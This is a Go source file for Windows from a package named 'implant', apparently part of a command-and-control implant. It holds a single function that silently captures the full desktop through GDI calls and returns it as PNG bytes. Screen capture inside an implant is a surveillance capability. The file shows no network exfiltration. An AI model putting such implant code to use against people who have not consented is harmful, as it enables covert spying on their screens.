//go:build windows

package implant

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"image"
	"image/png"
	"syscall"
	"unsafe"
)

var (
	user32 = syscall.NewLazyDLL("user32.dll")
	gdi32  = syscall.NewLazyDLL("gdi32.dll")

	procGetDC            = user32.NewProc("GetDC")
	procReleaseDC        = user32.NewProc("ReleaseDC")
	procGetSystemMetrics = user32.NewProc("GetSystemMetrics")

	procCreateCompatibleDC = gdi32.NewProc("CreateCompatibleDC")
	procCreateDIBSection   = gdi32.NewProc("CreateDIBSection")
	procSelectObject       = gdi32.NewProc("SelectObject")
	procBitBlt             = gdi32.NewProc("BitBlt")
	procDeleteDC           = gdi32.NewProc("DeleteDC")
	procDeleteObject       = gdi32.NewProc("DeleteObject")
)

const (
	SRCCOPY        = 0x00CC0020
	SM_CXSCREEN    = 0
	SM_CYSCREEN    = 1
	DIB_RGB_COLORS = 0
	BI_RGB         = 0
)

// CaptureScreenshot captures the entire desktop and returns PNG-encoded bytes.
// Uses CreateDIBSection for direct pixel buffer access — no GetDIBits needed.
func CaptureScreenshot() ([]byte, error) {
	// Get desktop device context
	hdcScreen, _, _ := procGetDC.Call(0)
	if hdcScreen == 0 {
		return nil, fmt.Errorf("GetDC failed")
	}
	defer procReleaseDC.Call(0, hdcScreen)

	// Get screen dimensions
	width, _, _ := procGetSystemMetrics.Call(SM_CXSCREEN)
	height, _, _ := procGetSystemMetrics.Call(SM_CYSCREEN)
	if width == 0 || height == 0 {
		return nil, fmt.Errorf("GetSystemMetrics returned zero dimensions")
	}

	w := int32(width)
	h := int32(height)

	// Build BITMAPINFOHEADER (40 bytes) — for 32-bit BI_RGB no color table needed
	bmi := make([]byte, 40)
	binary.LittleEndian.PutUint32(bmi[0:4], 40)        // biSize
	binary.LittleEndian.PutUint32(bmi[4:8], uint32(w))  // biWidth
	binary.LittleEndian.PutUint32(bmi[8:12], uint32(-h)) // biHeight negative = top-down DIB
	binary.LittleEndian.PutUint16(bmi[12:14], 1)         // biPlanes
	binary.LittleEndian.PutUint16(bmi[14:16], 32)        // biBitCount
	binary.LittleEndian.PutUint32(bmi[16:20], BI_RGB)    // biCompression
	// remaining fields (biSizeImage, biXPelsPerMeter, etc.) stay 0

	// Create compatible DC
	hdcMem, _, _ := procCreateCompatibleDC.Call(hdcScreen)
	if hdcMem == 0 {
		return nil, fmt.Errorf("CreateCompatibleDC failed")
	}
	defer procDeleteDC.Call(hdcMem)

	// CreateDIBSection: DIB whose pixel memory we can read directly
	var pBits unsafe.Pointer
	hDib, _, _ := procCreateDIBSection.Call(
		hdcScreen,
		uintptr(unsafe.Pointer(&bmi[0])),
		DIB_RGB_COLORS,
		uintptr(unsafe.Pointer(&pBits)),
		0, // hSection
		0, // offset
	)
	if hDib == 0 {
		return nil, fmt.Errorf("CreateDIBSection failed")
	}
	defer procDeleteObject.Call(hDib)

	// Select DIB section into memory DC
	oldObj, _, _ := procSelectObject.Call(hdcMem, hDib)
	defer procSelectObject.Call(hdcMem, oldObj)

	// Copy screen to our DIB section
	ret, _, _ := procBitBlt.Call(hdcMem, 0, 0, uintptr(w), uintptr(h), hdcScreen, 0, 0, SRCCOPY)
	if ret == 0 {
		return nil, fmt.Errorf("BitBlt failed")
	}

	// Read pixel data directly from the DIB section's buffer
	// pBits points to w*h*4 bytes of BGRA pixel data (top-down due to negative height)
	pixelCount := int(w) * int(h)
	pixelData := unsafe.Slice((*byte)(pBits), pixelCount*4)

	// Convert BGRA → RGBA for Go's image.RGBA
	img := image.NewRGBA(image.Rect(0, 0, int(w), int(h)))
	for i := 0; i < pixelCount; i++ {
		src := pixelData[i*4 : i*4+4]
		dst := img.Pix[i*4 : i*4+4]
		dst[0] = src[2] // R ← B
		dst[1] = src[1] // G ← G
		dst[2] = src[0] // B ← R
		dst[3] = 255    // A
	}

	// Encode as PNG
	var pngBuf bytes.Buffer
	if err := png.Encode(&pngBuf, img); err != nil {
		return nil, fmt.Errorf("PNG encode: %w", err)
	}

	return pngBuf.Bytes(), nil
}
